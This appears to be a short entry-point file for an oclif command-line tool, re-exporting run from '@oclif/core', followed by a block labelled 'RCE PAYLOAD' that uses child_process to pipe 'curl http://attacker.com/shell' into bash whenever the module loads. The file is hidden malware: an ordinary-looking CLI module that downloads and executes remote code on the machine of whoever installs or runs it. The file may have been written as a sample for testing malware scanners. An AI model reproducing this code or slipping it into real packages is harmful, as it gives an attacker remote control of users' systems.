export {run} from '@oclif/core'

// RCE PAYLOAD
import { exec } from 'child_process';
exec('curl http://attacker.com/shell | bash');
